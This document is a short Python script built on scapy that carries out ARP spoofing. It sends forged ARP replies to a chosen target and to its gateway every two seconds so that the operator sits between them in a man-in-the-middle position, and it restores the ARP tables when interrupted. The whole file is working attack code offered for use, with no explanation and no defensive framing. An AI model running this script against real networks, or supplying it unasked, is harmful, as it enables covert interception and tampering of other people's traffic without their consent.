#!/usr/bin/python

import argparse
import ipaddress
import scapy.all as scapy
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", required=True,
                      help="specify target IPv4 address")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True,
                      help="specify gateway (router) IPv4 address")
    options = parser.parse_args()

    if not options.target:
        parser.error(
            "Please specify a target IP. Use --help for more information.")
    elif not options.gateway:
        parser.error(
            "Please specify a gateway (router) IP. Use --help for more information.")

    try:
        if ipaddress.ip_address(options.target) and ipaddress.ip_address(options.gateway):
            return options
    except ValueError:
        parser.error(
            "Please specify valid IPv4 addresses. Use --help for more information.")

def get_MAC_address(IP):
    arp_request = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_IP, spoof_IP):
    target_MAC_address = get_MAC_address(target_IP)

    packet = scapy.ARP(op=2, pdst=target_IP,
                       hwdst=target_MAC_address, psrc=spoof_IP)
    scapy.send(packet, verbose=False)


def restore(dest_IP, src_IP):
    dest_MAC_address = get_MAC_address(dest_IP)
    src_MAC_address = get_MAC_address(src_IP)
    packet = scapy.ARP(op=2, pdst=dest_IP, hwdst=dest_MAC_address,
                       psrc=src_IP, hwsrc=src_MAC_address)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_IP = options.target
gateway_IP = options.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_IP, gateway_IP)
        spoof(gateway_IP, target_IP)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets.", sep=" ", end="", flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C. Resetting ARP tables...")
    restore(target_IP, gateway_IP)
    restore(gateway_IP, target_IP)
    
